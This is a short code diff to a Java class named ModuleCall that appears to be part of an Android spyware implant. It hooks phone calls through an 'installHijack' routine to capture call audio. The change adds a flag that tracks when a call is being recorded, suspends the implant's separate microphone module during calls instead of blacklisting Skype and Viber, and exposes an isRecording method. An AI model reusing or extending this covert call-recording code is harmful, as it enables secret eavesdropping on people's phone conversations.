@@ -101,6 +101,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	private CallInfo callInfo;
 	private List<Chunk> chunks = new ArrayList<Chunk>();
 	private boolean[] finished = new boolean[2];
+	private boolean recording;
 
 	public static ModuleCall self() {
 		return (ModuleCall) ManagerModule.self().get(M.e("call"));
@@ -162,6 +163,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 				if (installHijack()) {
 					startWatchAudio();
+					recording = true;
 				}
 			} else {
 				if (Cfg.DEBUG) {
@@ -229,8 +231,9 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		// Initialize the callback system
 		
 		if (ModuleMic.self() != null) {
-			ModuleMic.self().addBlacklist("skype");
-			ModuleMic.self().addBlacklist("viber");
+			ModuleMic.self().suspend();
+			//ModuleMic.self().addBlacklist("skype");
+			//ModuleMic.self().addBlacklist("viber");
 		}
 		
 		hjcb = new CallBack();
@@ -874,5 +877,9 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				Check.log(TAG + " (run callback): " + o);
 			}
 		}
+	}
+
+	public boolean isRecording() {
+		return recording;
 	}
 }
